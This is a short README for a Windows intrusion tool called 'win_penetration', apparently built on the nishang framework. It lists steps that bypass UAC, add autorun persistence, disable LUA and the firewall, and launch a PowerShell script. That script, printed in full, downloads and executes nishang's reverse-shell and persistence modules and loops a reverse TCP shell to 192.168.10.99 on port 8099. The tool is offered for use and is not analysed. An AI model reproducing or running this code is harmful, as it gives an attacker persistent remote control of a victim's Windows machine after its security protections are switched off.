# win_penetration

powered by [nishang](https://github.com/samratashok/nishang)

### behaviour
- extract bat file to tmp directory
- bypass UAC and run bat file to:
    - copy self to autorun directory
    - disable LUA
	- close network firewall
	- extract 1.ps1 to powershell root directory
	- run 1.ps1

### 1.ps1
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
Add-Persistence -ScriptPath C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1


While(1){
	Try {
		Invoke-PowerShellTcp -Reverse -IPAddress 192.168.10.99 -Port 8099
	}
	Catch {
		Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
	}
	Start-Sleep -Seconds 3
}
```